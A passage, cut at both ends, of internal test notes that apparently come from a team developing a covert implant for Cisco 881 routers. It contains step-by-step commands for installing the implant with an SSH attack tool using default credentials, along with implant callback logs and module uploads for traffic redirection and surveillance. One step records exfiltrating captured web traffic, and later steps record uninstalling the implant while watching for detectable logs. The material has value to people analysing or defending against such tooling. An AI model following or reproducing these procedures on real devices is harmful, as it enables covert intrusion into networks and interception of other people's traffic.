<li>
<p>File format for swindle.crt should be the output of 'openssl x509 -in new_cert.crt -noout -text' followed by new_cert.crt:</p>
<p>Certificate:<br> Data:<br> Version: 1 (0x0)<br> Serial Number:<br> d8:2c:bd:b7:7d:47:4f:fc<br> Signature Algorithm: sha1WithRSAEncryption<br> Issuer: C=US, ST=CA, L=Home Town, O=Super T, OU=HR, CN=www.suptest.com/emailAddress=help@suptest.com<br> Validity<br> Not Before: Jun 16 13:05:52 2015 GMT<br> Not After : Jun 15 13:05:52 2016 GMT<br> Subject: C=US, ST=CA, L=Home Town, O=Super T, OU=HR, CN=www.suptest.com/emailAddress=help@suptest.co<br>m<br> Subject Public Key Info:<br> Public Key Algorithm: rsaEncryption<br> <span class="glossary">RSA<span class="glossary-tt">Encryption algorithm</span></span> Public Key: (1024 bit)<br> Modulus (1024 bit):<br> 00:d8:2f:b2:59:62:b0:ee:a0:81:8e:38:04:6e:74:<br> 3d:dc:bf:41:99:b5:4c:d4:04:34:1c:83:21:1e:5a:<br> 23:11:ff:7f:a9:5c:51:92:c7:dc:4f:ba:0b:04:09:<br> 07:dd:b6:d6:a1:fa:97:01:34:8f:96:5e:cc:95:3c:<br> b6:d1:61:8f:8a:a5:5b:ae:c4:05:b5:87:2a:30:4c:<br> 15:02:bb:95:dc:ba:98:bf:ab:d1:39:a0:d1:da:15:<br> 7d:95:48:1b:88:51:96:7c:f2:79:ff:a0:5d:d2:d8:<br> 87:a2:09:47:9c:f0:89:cc:98:57:d9:55:1c:c4:dd:<br> 80:c9:41:17:37:24:fc:89:7d<br> Exponent: 65537 (0x10001)<br> Signature Algorithm: sha1WithRSAEncryption<br> 0f:ed:5e:1a:61:98:f7:3a:8e:de:3d:6b:ee:5e:23:e7:24:30:<br> d2:f1:e3:d5:ec:f4:3c:59:67:9c:e1:0a:25:dd:c4:5a:5b:f4:<br> 82:31:23:9f:ed:d9:fa:59:a2:d5:80:99:a1:1f:bc:19:90:29:<br> 77:16:29:18:25:38:03:a9:0d:54:dd:05:cb:f2:2a:ce:9a:e3:<br> 4d:c0:c1:e7:23:5c:c5:97:cf:94:85:a0:8d:1e:9a:f1:7d:6d:<br> 50:9e:e4:7f:a7:79:3e:8e:c4:a4:c3:51:28:a9:ac:31:dc:e1:<br> 4e:c1:d9:6f:08:99:96:02:ea:d4:79:f6:1e:de:cd:fa:a4:3d:<br> b7:9d<br>-----BEGIN CERTIFICATE-----<br>MIICiTCCAfICCQDYLL23fUdP/DANBgkqhkiG9w0BAQUFADCBiDELMAkGA1UEBhMC<br>VVMxCzAJBgNVBAgTAkNBMRIwEAYDVQQHEwlIb21lIFRvd24xEDAOBgNVBAoTB1N1<br>cGVyIFQxCzAJBgNVBAsTAkhSMRgwFgYDVQQDEw93d3cuc3VwdGVzdC5jb20xHzAd<br>BgkqhkiG9w0BCQEWEGhlbHBAc3VwdGVzdC5jb20wHhcNMTUwNjE2MTMwNTUyWhcN<br>MTYwNjE1MTMwNTUyWjCBiDELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAkNBMRIwEAYD<br>VQQHEwlIb21lIFRvd24xEDAOBgNVBAoTB1N1cGVyIFQxCzAJBgNVBAsTAkhSMRgw<br>FgYDVQQDEw93d3cuc3VwdGVzdC5jb20xHzAdBgkqhkiG9w0BCQEWEGhlbHBAc3Vw<br>dGVzdC5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANgvsllisO6ggY44<br>BG50Pdy/QZm1TNQENByDIR5aIxH/f6lcUZLH3E+6CwQJB9221qH6lwE0j5ZezJU8<br>ttFhj4qlW67EBbWHKjBMFQK7ldy6mL+r0Tmg0doVfZVIG4hRlnzyef+gXdLYh6IJ<br>R5zwicyYV9lVHMTdgMlBFzck/Il9AgMBAAEwDQYJKoZIhvcNAQEFBQADgYEAD+1e<br>GmGY9zqO3j1r7l4j5yQw0vHj1ez0PFlnnOEKJd3EWlv0gjEjn+3Z+lmi1YCZoR+8<br>GZApdxYpGCU4A6kNVN0Fy/IqzprjTcDB5yNcxZfPlIWgjR6a8X1tUJ7kf6d5Po7E<br>pMNRKKmsMdzhTsHZbwiZlgLq1Hn2Ht7N+qQ9t50=<br>-----END CERTIFICATE-----</p>
<p><br><br></p>
</li>
</ul>
</li>
<li>Service beastbox start</li>
<li>Verify that Beastbox is working by web browsing to the Proxy IP and you should get forwarded to the Cover Web server for 80 and 443</li>
</ul>
</li>
<li>Setup Blot LP<ul>
<li>Copy spicerack, salt, pepper, and scramble rpms onto Blot LP</li>
<li>Install spicerack, salt, pepper and scramble from rpms</li>
<li>Run spicerack - /opt/spicerack/spice_rack 2&gt;&amp;1 &gt;/dev/null &amp; - <span style="color: rgb(255,0,0);">libcrypto.so.0.9.8 error here - CMN-3</span>
</li>
<li><span style="color: rgb(255,0,0);">Disbabled iptables to get connection from impant to work - need to add rule to firewall instead of disabling</span></li>
</ul>
</li>
<li>Copy Cinnamon network and redirect modules from BuildVM to /opt/pepper/cmds directory on LP<br><ul>
<li>scp implant/modules/powerpc/redir-powerpc.module root@172.20.13.11:/opt/pepper/cmds/.</li>
<li>scp implant/modules/powerpc/survey-powerpc.module root@172.20.13.11:/opt/pepper/cmds/.</li>
</ul>
</li>
<li><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">CoverWeb server - standard web server for 80 and 443 should be configured</span></span></li>
</ul>
</li>
<li>
<span><span style="color: rgb(0,0,0);">Setup ICON VM</span></span><ul>
<li><span><span style="color: rgb(0,0,0);">Copy bacon rpm to ICON VM</span></span></li>
<li><span style="color: rgb(0,0,0);">Install bacon from rpm -<span style="color: rgb(255,0,0);"> error here, had to compile bacon on the Build <span class="glossary">VM<span class="glossary-tt">Virtual Machine</span></span> and copy the executable and .cfg file to ICON /opt/bacon/ CMN-2</span></span></li>
<li>
<span><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">On Blot LP, use salt to calculate the Node ID</span><br></span></span></span><ul>
<li><span><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Copy first 0x80 bytes from Motherboard info in output if <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> command "show diag" on the <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> into a flie /opt/salt/cookie.txt</span></span></span></span></li>
<li><span><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">./salt cookie.txt</span></span></span></span></li>
</ul>
</li>
<li><span style="color: rgb(0,0,0);">Make a copy of /opt/bacon/bacon.cfg called 881-cfg</span></li>
<li>
<span><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Edit the 881-cfg file</span></span></span></span><ul>
<li><span><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Change Node ID (called UNIQUE_ID in this file) calculated by salt - 0xfb583dbf for 881-Top</span></span></span></span></li>
<li><span><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Change Toold ID - enter Tool ID that was used with beastbox/swindle - 0x9219D10C in our test case</span></span></span></span></li>
</ul>
</li>
<li><span><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Copy the 880-norb folder from BuildVM to ICON using windows share</span><br></span></span></li>
<li>
<span><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Copy the 880-norb folder from BuildVM to ICON using scp to avoid the above error</span><br></span></span></span></span><ul><li>
<span><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Must initiate SCP from ICON due to iptables - scp -r root@10.9.8.108:/home/cmn-build/cmn-5.0.0/implant/880-norb .</span></span></span></span></span><span><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);"><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);"><br></span></span></span></span></span>
</li></ul>
</li>
<li>
<span style="color: rgb(0,0,0);">Copy <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> 4.1 to ICON - it includes remote</span><span style="color: rgb(0,0,0);"><br></span>
</li>
<li>
<span style="color: rgb(0,0,0);">Setup remote</span><ul>
<li><span style="color: rgb(0,0,0);">su - root</span></li>
<li><span style="color: rgb(0,0,0);">chmod -R +x data/config/npc3/profile</span></li>
<li>
<span style="color: rgb(0,0,0);">Edit data/config/npc3/target.py</span><ul>
<li><span style="color: rgb(0,0,0);">interpacket time = 0.1</span></li>
<li><span style="color: rgb(0,0,0);">arch = 'ppc'</span></li>
<li><span style="color: rgb(0,0,0);">machine = '880'</span></li>
</ul>
</li>
<li><span style="color: rgb(0,0,0);">Edit target-aliases with IP of target - <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> in our test case</span></li>
<li><span style="color: rgb(0,0,0);">Copy ramUploadAndExecuteCmn800.py from utilities on BuildVM to ICON's NPC3CP-5.2/bin/remote/bin directory</span></li>
</ul>
</li>
</ul>
</li>
<li><span style="color: rgb(0,0,0);">Generate Seed traffic on the test network - watch -n2 wget -nv -T 1 -O /dev/null <span class="external">http://alias.google.co</span>m</span></li>
</ul>
<ol>
<li>Smoke Test - Install CMN<ul>
<li>
<strong>Reload 881 router to start with clean setup</strong><ul>
<li>Sh proc cpu hist = 2% CPU without traffic load</li>
<li>Sh mem = Total-26214400 :: Used-9686440 :: Free-16527960</li>
</ul>
</li>
<li>
<strong>From Cinnabuild-5.0.0 VM:</strong><ul><li>/home/cmn-build/cmn-5.0/implant# make clean 880-norb   (script completes and creates 880-norb directory)</li></ul>
</li>
<li>
<strong>From Cinnamon-ICON:</strong><ul>
<li>/home/user1# scp -r root@10.9.8.108:/home/cmn-build/cmn-5.0/implant/880-norb/ .<ul><li>Enter password and directory copies over</li></ul>
</li>
<li>
<p>/home/user1/IAC 4.1.0/delivery/IAC-4.1.0/bin# ./sshiac-ppc -i <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> -l cisco:cisco</p>
<ul>
<li>881 cpu spikes to 99% two different times for about 20 seconds each</li>
<li>LGDHM codes given and ssh-iac is complete</li>
</ul>
</li>
<li>/home/user1/IAC 4.1.0/delivery/NPC3CP-5.2/bin/remote# vim target-aliases<br><ul>
<li>Configure target IP and procid</li>
<li>#source aliases = remote&gt;</li>
<li>#broad</li>
<li>#./seq set 1</li>
<li>#broad = status OK</li>
<li><p>[target:<span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>] remote&gt; ./bin/ramUploadAndExecuteCmn800.py /home/user1/880-norb/cmn-880-norb.bin</p></li>
<li>"yes"</li>
<li>file chunks uploaded and reach 100%</li>
<li>Wait 3 minutes minimum<ul>
<li>sh proc cpu hist: spikes to 11-12% for five seconds about once a minute and then settles in to 4-6% repeatidly</li>
<li>sh mem = Total-26214400 :: Used-9686440 :: Free-16527960</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Smoke Test - Establish Comms<ul>
<li><p>[root@blot-spicerack log]# tail -f spicerack.log</p></li>
<li>
<p>user1@<span class="external">Cinnamon-ICON:/opt/bacon$</span> sudo ./bacon <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> 881.cfg <span class="external">www.suptest.com</span> 443</p>
<ul><li>Spicerack log shows callback from implant<ul>
<li><p>06/16/2015 13:10:19.065 - Mission2:0:Debug: Socket accept info: client address = 172.20.13.10, port = 32991<br>06/16/2015 13:10:19.071 - Mission2:11:Info : SESSION STARTED<br>06/16/2015 13:10:19.071 - Mission2:11:Debug: Connected To: IP address = 172.20.13.10, port = 32991.<br>06/16/2015 13:10:19.916 - Mission2:11:Debug: +++Packet received (12 bytes).+++<br>06/16/2015 13:10:19.916 - Mission2:11:Debug: +++Packet received (780 bytes).+++<br>06/16/2015 13:10:19.916 - Mission2:11:Info : +++Message received (792 bytes).+++<br>06/16/2015 13:10:19.916 - Mission2:11:Debug: Time packet received = 06/16/2015 13:10:19.916.<br>06/16/2015 13:10:19.916 - Mission2:11:Debug: Data Length = 708<br>06/16/2015 13:10:19.917 - Mission2:11:Debug: Tool ID Xor = 3<br>06/16/2015 13:10:19.917 - Mission2:11:Info : Tool ID = 0x9219d10c<br>06/16/2015 13:10:19.917 - Mission2:11:Debug: Seed = 0x33fb3f95<br>06/16/2015 13:10:19.917 - Mission2:11:Debug: Hash = 0x3536<br>06/16/2015 13:10:19.917 - Mission2:11:Info : Node ID = 0xfb583dbf<br>06/16/2015 13:10:19.917 - Mission2:11:Debug: Timestamp = 0x000014a4<br>06/16/2015 13:10:19.917 - Mission2:11:Debug: Module ID = 1<br>06/16/2015 13:10:19.917 - Mission2:11:Debug: Last Packet Indicator = 1<br>06/16/2015 13:10:19.932 - Mission2:11:Debug: Payload data length from encrypted header = 692.<br>06/16/2015 13:10:19.932 - Mission2:11:Debug: Payload data type = 0, data length = 686, data end = 1.<br>06/16/2015 13:10:19.932 - Mission2:11:Debug: COMMS-H request mission module name = Beacon, ID = 1.<br>06/16/2015 13:10:19.932 - Mission2:11:Info : +++BTHP REQUEST PACKET 1 RECEIVED - Beacon+++<br>06/16/2015 13:10:19.932 - Mission2:0:Info : dumpRawPacket: For RCVD_RAW_FILE<br>06/16/2015 13:10:19.935 - Mission2:11:Info : Dumped raw packet received to file: /opt/spicerack/data/fb583dbf/Beacon/receive/20150616131019_0000000011.raw.<br>06/16/2015 13:10:19.935 - Mission2:11:Debug: Payload data type = 0, data length = 686, data end = 1.<br>06/16/2015 13:10:19.938 - Mission2:11:Debug: Writing to receive file /opt/spicerack/data/fb583dbf/Beacon/receive/20150616131019_0000000011.rcvd.<br>06/16/2015 13:10:19.938 - Mission2:11:Info : Dumped BTHP request string received to file: /opt/spicerack/data/fb583dbf/Beacon/receive/20150616131019_0000000011.rcvd.<br>06/16/2015 13:10:19.938 - Mission2:11:Info : ---Building COMMS-H signal response(s)---<br>06/16/2015 13:10:19.938 - Mission2:11:Debug: Parsing .send file for commands.<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: No commands present. Sending No Op<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Total COMMS-H payload length of command(s) reply data = 15<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Single packet response, payloadLength = 77, payloadDataLength = 15, lastPacketIndicator = 1<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Inserting Tool ID = 0x9219d10c, Tool ID Xor Key Index = 3<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Seed = 0x91a54cfe<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: COMMS-H response auth hash = 0xac54.<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Returning built 1 COMMS-H reply packet(s).<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: BTHP reply payload data length = 77.<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: hdr_len = 24, data_len = 77.<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Before response write, replySize = 101.<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: ---Packet sent (101/101 bytes).---<br>06/16/2015 13:10:19.939 - Mission2:11:Info : ---Message sent (101 bytes).---<br>06/16/2015 13:10:19.939 - Mission2:11:Debug: Time response sent = 06/16/2015 13:10:19.939.<br>06/16/2015 13:10:19.939 - Mission2:11:Info : ---COMMS-H REPLY SENT (1/1) - ---<br>06/16/2015 13:10:19.942 - Mission2:11:Info : Dumped raw packet sent to file: /opt/spicerack/data/fb583dbf/Beacon/sent/20150616131019_0000000011.raw.<br>06/16/2015 13:10:19.945 - Mission2:11:Debug: Writing to sent file /opt/spicerack/data/fb583dbf/Beacon/sent/20150616131019_0000000011.sent.<br>06/16/2015 13:10:20.916 - Mission2:11:Debug: CLOSING SOCKET 5<br>06/16/201



5 13:10:20.916 - Mission2:11:Debug: Shutdown connection: IP address = 172.20.13.10, port = 32991.<br>06/16/2015 13:10:20.917 - Mission2:11:Info : SESSION ENDED</p></li>
<li>Log file is appended on Blot-Proxy-CentOS 5.6<ul><li><p>[root@blot blot]# pwd<br>/var/log/blot<br>[root@blot blot]# ls -<span class="user">User #?</span><br>total 148K<br>drwxr-xr-x 2 beastbox blot 4.0K Mar 2 06:10 ./<br>drwxr-xr-x 17 root root 4.0K Jun 16 04:02 ../<br>-rw-r--r-- 1 beastbox blot 131K Jun 16 09:14 beastbox.log.enc</p></li></ul>
</li>
</ul>
</li></ul>
</li>
</ul>
</li>
<li>Smoke Test - Install/Uninstall Modules<ul>
<li>Create module and copy to Spicerack VM<ul>
<li><p>root@<span class="external">cinnabuild-5:/home/cmn-build/cmn-5.0/implant/modules#</span> make clean redir-powerpc</p></li>
<li><p>[root@blot-spicerack cmds]# scp -r <span class="mail">root@10.9.8.108</span>:/home/cmn-build/cmn-5.0/implant/modules/redir/powerpc/redir-powerpc.module .</p></li>
</ul>
</li>
<li>Create upload cmd file<ul>
<li>/opt/pepper/cmds</li>
<li><p>[root@blot-spicerack cmds]# vi redir-powerpc.cmd<br>module_upload|redir-powerpc.module</p></li>
<li><p>[root@blot-spicerack cmds]# .././pepper redir-powerpc.cmd</p></li>
<li><p>[root@blot-spicerack cmds]# cp redir-powerpc.send /opt/spicerack/data/fb583dbf/Beacon/send/.</p></li>
<li>
<p>user1@<span class="external">Cinnamon-ICON:/opt/bacon$</span> sudo ./bacon <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> 881.cfg <span class="external">www.suptest.com</span> 443<br>Sent packet to <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>:44719</p>
<ul><li>
<p>[root@blot-spicerack receive]# more 20150616170301_0000000013.status</p>
<p>[Command Results]<br>Total commands reporting status: 1</p>
<p>Command: 1<br> Module: 4<br> Command: 0<br> Status: SUCCESS</p>
<p>[root@blot-spicerack receive]# more 20150616171309_0000000001.rcvd</p>
<p>[Session Info]<br>Rcvd Start Time = 06/16/2015 17:13:09.854<br>Session = 1<br>Request Type = HTTPS<br>Module = Beacon</p>
<p>[Connection Info]<br>Proxy IP = 172.20.13.10:443<br>Source IP = <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>:27816<br>Destination IP = 172.20.13.11:4097</p>
<p>[Implant Info]<br>Unique Implant ID = 0xfb583dbf<br>Tool ID = 0x9219d10c<br>Up Time = 19854<br>Impersonated IP = <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span></p>
<p>[Versioning]<br>Cinnamon Version = 5.0.0 Jun 16 2015 - 07:17:00<br>IOS Version = C880 Software (C880DATA-UNIVERSALK9-M), Version 15.1(2)T4, RELEASE SOFTWARE (fc1)<br>Build ID = 1856:7b366e5a9b31</p>
<p>[Beacon Health]<br>Max Consecutive Timed Beacon Failures = 10<br>Failed Beacon Counter = 6<br>Beacon Failsafe Status = Not Tripped</p>
<p>[Memory Health]<br>IOMEM Free Size = 0x00fbac58 Bytes</p>
<p>[BreakPoints]<br>Total Breakpoints = 6<br>Address Label<br>---------- -----<br>0x80495534 0x4<br>0x80cced88 0x4<br>0x80258478 0x4<br>0x8111eca0 0x4<br>0x802376dc 0x4<br>0x8210cfbc 0x1</p>
<p>[Modules]<br>Active Modules: 5<br>Module Version<br>0 5.0.0<br>1 5.0.0<br>2 5.0.0<br>3 5.0.0<br>4 5.0.0</p>
</li></ul>
</li>
<li>Upload Survey Module<ul>
<li>Before survey module upload:<br><p>881-Top#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42485408 121546048 114024412 109062604<br> I/O E700000 26214400 9549340 16665060 16487744 16493660</p>
</li>
<li><p>Created survey module on BuildVM - make clean survey-powerpc</p></li>
<li>Copied survey module to Blot Spicerack - scp survey-powerpc root@172.20.13.11:/opt/pepper/cmds/.</li>
<li>Created survey_upload.cmd - module_upload|survey-powerpc.module</li>
<li>Peppered survey_upload.cmd - .././pepper survey_upload.cmd</li>
<li>Copied .send file to send directory and triggered implant</li>
<li>Module uploaded successfully:<br><p>[root@blot-spicerack receive]# more 20150616182438_0000000002.status</p>
<p>[Command Results]<br>Total commands reporting status: 1</p>
<p>Command: 1<br> Module: 4<br> Command: 0<br> Status: SUCCESS</p>
</li>
<li>
<p>Memory after module upload:</p>
<p>881-Top#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42485460 121545996 114024412 109062604<br> I/O E700000 26214400 9549340 16665060 16487744 16493660</p>
</li>
<li>Did not observe any log messages</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Smoke Test - Uninstall CMN<ol>
<li>Created command file to uninstall - <p>device_uninstall|0</p>
</li>
<li>Peppered command and copied to send directory, triggered CMN</li>
<li>Impant picked up file - saw no spike in CPU, but instead a drop from about 11% five second value to 5%.</li>
<li>memory after uninstall<br><p>881-Top#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42497720 121533736 114024412 109062604<br> I/O E700000 26214400 9549340 16665060 16487744 16493660</p>
</li>
<li>Uninstall leaves behind IAC </li>
</ol>
</li>
<li>Ad hoc Test - Reinstall after install/uninstall<ol>
<li>After test 4, attempted to install base <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> again via remote - upload successful</li>
<li>Memory after uninstall<br><p>881-Top#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42497720 121533736 114024412 109062604<br> I/O E700000 26214400 9549340 16665060 16487744 16493660</p>
</li>
<li><p>Performed 3 base install/uninstalls with device_uninstall|0 command and 3 more base uninstalls with device_uninstall|1</p></li>
<li>No crash, no cpu spikes, no syslog messages to buffer or console.</li>
<li>Collected a show tech after uninstall</li>
<li>Memory after install/uninstalls - Used memory about 12kb lower and no change to largest free block :<br><p>881-Top#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42485788 121545668 114024412 109062604<br> I/O E700000 26214400 9549340 16665060 16487744 16493660</p>
</li>
</ol>
</li>
<li>Ad hoc Test - Install <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> base and then both modules with one command file<ol>
<li>Reloaded device to start with clean DUT</li>
<li>Attacked with SSHIAC and uploaded <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> base</li>
<li>created a command file with both redir and survey module upload commands<br>module_upload|survey-powerpc.module<br>module_upload|redir-powerpc.module</li>
<li>When pepper was run on this file, command file validation failed error - expecting 1 line</li>
<li>When I tried to put both files on 1 line, got a command file validation error - expecting 1 argument</li>
<li>Created two separate .send files to upload the modules and copied both into send directory, triggered implant</li>
</ol>
</li>
<li>Ad hoc Test - Attempt to install modules when they are already installed<ol>
<li>Got the following status file<br><p>[root@blot-spicerack receive]# more 20150616210905_0000000019.status</p>
<p>[Command Results]<br>Total commands reporting status: 4</p>
<p>Command: 1<br> Module: 4<br> Command: 0<br> Status: FAILURE - 0x00000004</p>
<p>Command: 2<br> Module: 4<br> Command: 0<br> Status: SUCCESS</p>
<p>Command: 3<br> Module: 4<br> Command: 0<br> Status: FAILURE - 0x00000004</p>
<p>Command: 4<br> Module: 4<br> Command: 0<br> Status: SUCCESS</p>
<p>[root@blot-spicerack receive]#</p>
</li>
<li><p>No logs reported on console or syslog</p></li>
</ol>
</li>
<li>Ad hoc Test - Simulate power failure, subsequent beacon attempt, and re-attack<ul>
<li>Memory prior to start of test:<ul><li><p>Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42310372 121721084 116302072 111284268<br> I/O E700000 26214400 9549340 16665060 16525184 16531100</p></li></ul>
</li>
<li>Pull power from 881 while running with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and modules previously installed and running successfully<ul>
<li>No suspicious console/buffer logs on reboot other than what would show up after a reboot after power failure</li>
<li>Memory post boot-up:<ul><li><p>Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41706948 122324508 116079892 111069152<br> I/O E700000 26214400 9683944 16530456 16527360 16527324</p></li></ul>
</li>
</ul>
</li>
<li>Attempt to send bacon simulating operator that is not aware that the target device had lost power<ul>
<li>Sent multiple ./bacon beacon requests without response on Spicerack LP.</li>
<li>No addtional console/buffer logs or snmp traps show from target device</li>
</ul>
</li>
<li>Re-attack with ssh-iac and re-implant 881 target device:<ul><li>
<p>root@<span class="external">Cinnamon-ICON:/home/user1/IAC</span> 4.1.0/delivery/IAC-4.1.0/bin# ./sshiac-ppc -i <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> -l cisco:cisco</p>
<ul><li>Received: <span style="line-height: 1.4285715;">LGDHM</span>
</li></ul>
<ul>
<li>#source aliases = remote&gt;</li>
<li>#broad</li>
<li>#./seq set 1</li>
<li>#broad = status OK</li>
<li><p>[target:<span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>] remote&gt; ./bin/ramUploadAndExecuteCmn800.py /home/user1/880-norb/cmn-880-norb.bin</p></li>
<li>"yes"</li>
<li>file chunks uploaded and reach 100%</li>
<li>Wait 3 minutes minimum</li>
<li>Sent beacon from ICON to <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> -&gt; successfully received reply on Spicerack LP<ul><li>No console/bugger logs or snmp traps received</li></ul>
</li>
</ul>
</li></ul>
</li>
</ul>
</li>
<li>Long Term Monitoring - Test for memory leaks<ol>
<li>Configured 881-Bottom to send <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> traps, syslogs and <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> monitoring to solarwinds server</li>
<li>Configured with Seeds traffic from a single host connected behind 881</li>
<li>Implanted with Cinnamon and redir and survey modules</li>
<li>Connected IXIA to 881 and 3845 to run traffic - have not started traffic yet</li>
<li>Established a survey rule for all 80 and 443 traffic and with a duration of 12 hours - will let it run over night and check solarwinds in the morning.  Currently only seeds traffic running wget every 2 seconds. The following morning I was able to exfil all the data from the device - saw the 80 and 443 traffic after unscrambling the file.  </li>
<li>Enabled two redirect rules to run overnight - traffic not currently matching but rules are active.</li>
<li>Tried enabling IXIA and was attempting different network neighborhood settings - none were resulting in successful tcp sessions. Logged on Seeds host and attempted to ping 10.100.100.1 - could not.  Logged onto 3845 and noticed the eigrp session for 881_bottom was not active and tunnel was down.  Checked 881 and the console window had closed out.  Re-established console session and uptime was 1 minute, crashinfo in flash.<br>From <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> Trap:<br><span style="color: rgb(0,0,0);">whyReload = error - an Illegal Opcode exception, <span class="glossary">PC<span class="glossary-tt">Personal Computer</span></span> 0x804D1778 </span><br><span style="color: rgb(0,0,0);">sysUpTime = 42.31 seconds </span><br><span style="color: rgb(0,0,0);">snmpTrapOID = SNMPv2-MIB:coldStart </span><br><span style="color: rgb(0,0,0);">sysUpTime = 1 minute 12.37 seconds </span>
</li>
<li><span style="color: rgb(0,0,0);">Attempted to reproduce now that <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> is not on device after reload, but it is not crashing at this time.  Need to put <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> back on and attempt to reproduce crash. - <span style="color: rgb(255,0,0);">CMN-4</span></span></li>
<li><span style="color: rgb(0,0,0);">Re-installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules and ran the same IXIA traffic test three more times, and was not able to reproduce the crash.</span></li>
</ol>
</li>
<li>Test restarting modules/loading/unloading without reboot<ol>
<li><span style="color: rgb(0,0,0);">881-Top with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed non-persistently</span></li>
<li>
<span style="color: rgb(0,0,0);">Load both redir and tunnel modules with 1 command</span><br><span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>[root@blot-spicerack receive]# more 20150622192913_0000000070.status</p>
<span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>[Command Results]<br>Total commands reporting status: 2</p>
<span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>Command: 1<br> Module: 4<br> Command: 0<br> Status: SUCCESS</p>
<span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>Command: 2<br> Module: 4<br> Command: 0<br> Status: SUCCESS</p>
</li>
<li>Remove both redir and tunnel modules - module 4 fails - cannot delete redir module:<br><p>[root@blot-spicerack receive]# more 20150622194021_0000000075.status</p>
<p>[Command Results]<br>Total commands reporting status: 2</p>
<p>Command: 1<br> Module: 4<br> Command: 1<br> Status: SUCCESS</p>
<p>Command: 2<br> Module: 4<br> Command: 1<br> Status: FAILURE - 0x00000008</p>
</li>
<li>Attempted to remove module 4 individually, but I keep getting the same error code.</li>
<li>Beginning again with clean DUT</li>
<li>Loaded cmn-880-norb - installed with modules 0,1,2,4</li>
<li>First load redir module - installed as module 3</li>
<li>Second load survey module - installed as module 5</li>
<li>Deleted module 3 and module 5 in one command - success</li>
<li>Repeating steps g-i 4 times. No errors<ol><li>Attemped to delete modules that weren't present, failed gracefully with error code 8</li></ol>
</li>
</ol>
</li>
<li>SNMP Trap Test <ol>
<li>Tested upload of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> as well as upload of modules and <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> uninstall - no <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> Trap recorded</li>
